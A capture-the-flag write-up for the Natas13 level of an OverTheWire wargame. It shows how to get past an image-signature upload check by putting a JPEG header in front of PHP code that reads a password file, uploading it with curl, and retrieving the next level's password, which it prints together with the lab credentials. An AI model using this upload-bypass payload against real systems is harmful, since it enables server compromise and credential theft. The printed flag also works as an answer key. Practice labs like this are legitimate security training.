# Natas13

*	user: `natas13`
*	pass: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
*	url: `http://natas13.natas.labs.overthewire.org`
*	flag: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

## Procedure

1.	It seems to be the same approach of Natas12 but now, the file's
	signature is checked with the PHP function `exif_imagetype()`.
	According to documentation indeed, such function

		reads the first bytes of an image and checks its signature.

2.	JPEG signature is `0xFF 0xD8 0xFF 0xE0`, so let's start by forging
	a JPEG file

		$ echo -e "\xFF\xD8\xFF\xE0" > image.php
		$ file image.php
		image.php: JPEG image data

	Now append the PHP code

		$ echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> image.php
		$ file image.php
		image.php: JPEG image data

3.	Upload the "image" as in Natas12

		$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas13.natas.labs.overthewire.org
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas13</h1>
		<div id="content">
		For security reasons, we now only accept image files!<br/><br/>

		The file <a href="upload/7q86uwt60z.php">upload/7q86uwt60z.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

	and check the content

		$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/upload/7q86uwt60z.php
		����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
